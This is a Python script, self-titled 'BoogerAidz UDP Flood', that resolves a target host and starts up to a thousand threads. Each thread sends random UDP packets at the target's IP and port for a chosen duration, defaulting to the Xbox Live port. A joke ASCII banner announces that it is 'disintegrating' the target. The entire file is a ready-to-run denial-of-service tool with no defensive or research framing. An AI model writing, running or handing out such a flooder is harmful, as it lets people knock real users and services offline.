import time
import sys
import os
import random
import socket
import threading
from urllib.parse import urlparse

flag = threading.Event() # job control

def attack(ip, port, addr_f):
    global flag

    size = None
    # adjust for IP+UDP header, and any PPPOE/MPLS padding
    if addr_f == socket.AF_INET6:
        size = 1440
    else:
        size = 1460

    data = random.randbytes(size)

    while not flag.is_set():
        try:
            # Kernel spawn UDP socket + connect
            sock = socket.socket(addr_f, socket.SOCK_DGRAM)

            while not flag.is_set():
                # Deliver payload
                sock.sendto(data, (ip, port))

                # Avoid CPU spike
                time.sleep(0.001)
            
            # Kernel dispose socket
            sock.close()
        except:
            pass

def af_type(ip):
    try:
        # IPv4 Address Family
        socket.inet_pton(socket.AF_INET, ip)
        return socket.AF_INET
    except: #OSError:
        try:
            # IPv6 Address 
            socket.inet_pton(socket.AF_INET6, ip)
            return socket.AF_INET6
        except:
            sys.exit("\r\nError! Unable to resolve...\r\n")

def resolve(host):
    # Handle host as a URL (even if IP was given)
    if not host.startswith(('http://', 'https://')):
        host = 'http://' + host

    try:
        # Segment sections of URL in a URI class
        parsed = urlparse(host)

        # IPv6 support. Handles bracket format
        domain = parsed.hostname

        # Resolve host
        addr_info = socket.getaddrinfo(
            domain,
            None,
            # IPv4 or IPv6
            socket.AF_UNSPEC,
            socket.SOCK_STREAM
        )

        # Return primary address. Discard any failover address(s)
        ip = addr_info[0][4][0]
        return ip

    except Exception:
        sys.exit('\r\n\tUnable to resolve host!\r\n')

def main():
    if len(sys.argv) != 5:
        sys.exit(f'\r\n\tSyntax: python3 {os.path.basename(sys.argv[0])} <host> <port> <threads> <time-sec>\r\n')

    os.system('cls' if os.name == 'nt' else 'clear')

    # Attemmpt DNS Resolution
    ip_address = resolve(sys.argv[1].lower())

    # Conduct input validation
    try:
        port     = int(sys.argv[2])
        threads  = int(sys.argv[3])
        duration = int(sys.argv[4])

        if not (1 <= port <= 65535):
            # Default to Xbox Live (Open NAT)
            port = 3074

        if not (1 <= threads <= 1000):
            threads = 5

        if not (1 <= duration <= 3600):
            duration = 120
    except Exception as e:
        sys.exit('\r\n\tInvalid argument detected.\r\n')

    # Determine Address-Family for socket
    addr_f = af_type(ip_address)

    print(f'''\r\nAw geez Rick! That's a lot of bandwidth saturation!\r\n
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠⣿⠘⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣸⣿⣿⣆⠻⠿⠁⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣸⣾⣿⣿⣿⠸⠏⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣷⣦⣝⠻⢿⣿⣿⣿⣿⣿⣿⣿⡿⣸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣶⣬⡙⠿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⠿⢋⣥⠆⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠹⣿⣿⣿⣿⣿⣿⣿⣷⣦⡙⢿⡏⣾⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠰⣶⡶⢒⣨⣴⣾⣿⡟⠀⣸⣿⣿⣿⡿⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣜⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⣀⣠⣴⣾⣿⣿⣿⣿⣿⠁⠀⠿⠛⠉⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⣛⣛⣛⣛⣛⣛⡻⠿⢦⣾⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠹⣿⣿⣿⣿⣿⠟⣋⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣭⡛⢿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⠛⠛⠃⢻⣿⣿⡟⣡⣾⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⢿⣿⣿⣿⣿⣶⡍⢻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣷⣦⣙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣴⣿⣿⣿⣿⡿⠿⢛⣩⠴⣚⣩⣶⣾⡿⠿⢛⣛⣛⠻⣦⠻⣿⣿⣿ ⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣷⣦⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣰⣿⣿⣿⠟⣛⣁⣭⣥⣶⠿⢟⣋⣭⣴⠾⠿⣛⣋⣉⣠⣿⣦⢹⣿⣿⣦⣤⣤⣀⣀⣸⠿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣦⠙⢿⣿⣿⣿⣿⣿⣿⣿⡇⣿⡿⠿⠿⣛⣛⣛⣫⣥⣴⠾⢟⣋⣥⣶⣿⣿⣿⣿⣯⣙⡻⢿⣇⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣁⣴⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣦⡙⢿⣿⣿⣿⣿⣿⢃⣇⡒⠛⣛⣛⣛⣯⣍⠉⢶⣾⣿⣿⡟⣡⣿⣿⣿⣿⣿⣿⣿⣦⢹⡆⣿⣿⣿⣿⣿⣿⡾⠋⠁⠀⠀⠀⠉⠉⠉⠙⠛⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡙⢿⣿⣿⣿⡏⣿⡟⣿⣿⣿⣿⣿⣿⣿⣶⡝⢿⣿⢠⣿⠿⠟⣛⠉⢩⣭⣶⣶⡆⢷⢸⣿⣿⣿⡾⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣂⣼⣿⣿⠇⣿⢰⣿⣿⣿⣿⡿⠿⠿⣛⣋⡈⣿⠀⣶⣾⣿⣿⣶⣾⣿⣿⣿⡇⣸⡆⢿⣿⣿⣷⣄⠀ ⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠿⣛⣩⣴⣾⣿⣿⣿⣿⡆⣿⠸⠟⣋⣥⣄⢀⣿⣿⣿⣿⠃⣿⣧⡹⣿⣿⣿⣿⣿⣿⣿⠟⣰⣿⣇⢸⣿⣿⣿⣿⣿⡦  ⠈⠛⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣦⣄⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣌⢿⣿⣿⣿⣿⣿⣿⣿⠟⣴⣿⣿⡿⢮⣙⣛⣛⣛⣋⣤⡾⠛⢹⣿⠈⣿⣿⣿⡿⠋    ⠀⠈⢻⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣷⣦⣌⠛⠿⣿⣿⣿⣿⣿⡀⣿⣦⣝⠛⠿⠿⠿⢛⣥⣶⣏⢹⣿⣿⡘⡿⢿⣿⠿⠟⠋⢀⣴⣿⣿⠂⢶⣮⡻⡇⠀ ⠀⠀⠀⠀⠀⠀⠀⠉⠙⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⠙⢿⣿⣿⣇⢻⣿⠿⣿⣿⣿⣿⡿⠟⣡⣿⡘⣿⣿⡇⣿⣶⣦⣤⣴⣶⣿⣿⣿⡿⠀⢸⣿⠇⣆⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠄⣿⣿⠿⠸⣿⣷⣦⣭⣭⣴⣶⣿⣿⣿⣧⠹⣿⠇⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠈⠁⣠⣿⣷⡄⠀⠀⢀⣠⣤⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣡⣾⣿⠏⣴⡇⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⠿⡇⠀⢰⠆⣿⣿⣿⠿⠦⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢋⣴⣾⣿⣿⣿⡌⢿⣿⡈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠛⠛⢛⣛⣛⣛⣛⣻⣶⠀⡄⣸⠀⠉⠉⠁⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣯⣤⣤⣭⣭⣭⣭⣭⣭⠉⣦⣍⣃⢹⣿⣿⢿⣿⣿⡿⠛⣉⣴⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠰⠃⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠋⠁⢰⣿⣿⣿⣆⢿⡇⢸⢟⣥⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⡀⠐⠛⠛⠀⠀⠀⠀⣤⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⢸⣿⣿⠿⠟⢀⢿⣦⣭⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⡼⠁⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣬⣭⣤⣬⡍⠀⣦⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣀⠌⠀⠀⠀⠀⠀⠀⢠⣤⣤⣤⣤⣝⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠁⠀⢈⡛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣴⣶⣿⣿⣷⠀⠉⠙⣛⠛⠛⠛⢛⣋⣅⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠉⠁⠻⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢀⣀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢟⣫⣤⠖⣸⢠⣷⣦⣬⣭⣭⣭⣭⣤⣄⢠⡀⢦⣄⣙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢛⣡⣴⣿⣿⡏⣼⡏⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⢜⣿⡄⢦⣭⡿⣦⣍⡛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
\r\nDisintegrating {ip_address}:{port} for {duration} seconds! CTRL+C to abort...\r\n''')

    jobs = [] # Store concurrent jobs

    for _ in range(threads):
        x = threading.Thread(target=attack, args=(ip_address, port, addr_f))
        x.daemon = True # Ensure job does not continue in case of abrupt termination
        x.start()

        # Append to job list
        jobs.append(x)

    # Halt main thread until jobs complete
    try:
        flag.wait(timeout=duration)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        sys.exit(e)

    flag.set() # signal job cancellation

    time.sleep(0.001)

    for job in jobs:
        # Merge to main routine
        job.join()
    
    print("\r\nDone.\r\n")

if __name__ == "__main__":
    # BoogerAidz UDP Flood.
    main()
